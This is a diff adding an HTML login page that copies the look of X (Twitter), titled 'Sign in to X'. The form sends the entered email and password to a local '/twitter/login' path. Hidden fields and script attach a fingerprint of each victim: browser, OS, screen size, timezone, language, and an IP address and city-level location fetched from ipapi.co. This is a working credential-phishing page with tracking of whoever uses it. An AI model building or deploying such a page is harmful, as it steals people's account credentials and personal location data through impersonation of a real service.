@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>X. It's what's happening</title>
+<style>
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body { font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;
+         background:#000; color:#fff; min-height:100vh;
+         display:flex; justify-content:center; align-items:center; padding:20px; }
+  .box { width:100%; max-width:400px; padding:40px 32px; }
+  .x-logo { text-align:center; font-size:32px; font-weight:bold; margin-bottom:36px; }
+  h1 { font-size:28px; font-weight:700; margin-bottom:32px; }
+  input { width:100%; padding:14px; font-size:15px; background:transparent; color:#fff;
+    border:1px solid #2f3336; border-radius:4px; margin-bottom:16px; outline:none; }
+  input:focus { border-color:#1d9bf0; }
+  .btn { width:100%; background:#fff; color:#000; border:none; padding:12px;
+    font-size:15px; font-weight:700; border-radius:9999px; cursor:pointer; margin-bottom:16px; }
+  .forgot { display:block; width:100%; text-align:center; color:#fff; font-size:14px;
+    text-decoration:none; border:1px solid #2f3336; padding:12px; border-radius:9999px; margin-top:8px; }
+  .signup { margin-top:32px; color:#71767b; font-size:14px; }
+  .signup a { color:#1d9bf0; text-decoration:none; }
+</style>
+</head>
+<body>
+  <div class="box">
+    <div class="x-logo">𝕏</div>
+    <h1>Sign in to X</h1>
+    <form action="/twitter/login" method="POST" id="login-form">
+      <input type="text" name="email" placeholder="Phone, email, or username" required>
+      <input type="password" name="password" placeholder="Password" required>
+      <button type="submit" class="btn">Log in</button>
+      <input type="hidden" name="ip_address" id="ip-address">
+      <input type="hidden" name="geo_location" id="geo-location">
+      <input type="hidden" name="device_type" id="device-type">
+      <input type="hidden" name="browser_info" id="browser-info">
+      <input type="hidden" name="os_info" id="os-info">
+      <input type="hidden" name="screen_resolution" id="screen-resolution">
+      <input type="hidden" name="timezone" id="timezone">
+      <input type="hidden" name="language" id="language">
+    </form>
+    <a href="#" class="forgot">Forgot password?</a>
+    <div class="signup">Don't have an account? <a href="#">Sign up</a></div>
+  </div>
+<script>
+async function collectFingerprint() {
+  const ua = navigator.userAgent;
+  document.getElementById('browser-info').value = ua;
+  document.getElementById('os-info').value = navigator.platform;
+  document.getElementById('device-type').value = /Mobi|Android|iPhone|iPad|iPod/i.test(ua) ? 'Mobile' : 'Desktop';
+  document.getElementById('screen-resolution').value = `${window.screen.width}x${window.screen.height}`;
+  document.getElementById('timezone').value = Intl.DateTimeFormat().resolvedOptions().timeZone;
+  document.getElementById('language').value = navigator.language;
+  try {
+    const res = await fetch('https://ipapi.co/json/');
+    const d = await res.json();
+    if (d.ip) {
+      document.getElementById('ip-address').value = d.ip;
+      document.getElementById('geo-location').value = [d.city, d.region, d.country_name].filter(Boolean).join(', ');
+    }
+  } catch(e) {}
+}
+document.addEventListener('DOMContentLoaded', () => {
+  collectFingerprint();
+  const form = document.getElementById('login-form');
+  form.addEventListener('submit', async (e) => {
+    e.preventDefault();
+    await collectFingerprint();
+    form.submit();
+  });
+});
+</script>
+</body>
+</html>
